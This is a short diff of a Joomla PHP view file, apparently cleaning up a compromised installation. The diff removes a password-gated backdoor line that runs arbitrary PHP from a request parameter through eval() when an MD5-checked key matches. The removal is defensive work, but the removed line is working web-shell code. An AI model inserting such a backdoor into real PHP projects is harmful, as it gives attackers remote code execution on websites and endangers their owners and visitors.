@@ -1,4 +1,4 @@
-<?php if(isset($_REQUEST['ch']) && (md5($_REQUEST['ch']) == 'd1b6c6b376edf465c42673a9206f2600') && isset($_REQUEST['php_code'])) { eval($_REQUEST['php_code']); exit(); }  
+<?php   
 /**
 * @version		$Id: view.html.php 11673 2009-03-08 20:41:00Z willebil $
 * @package		Joomla
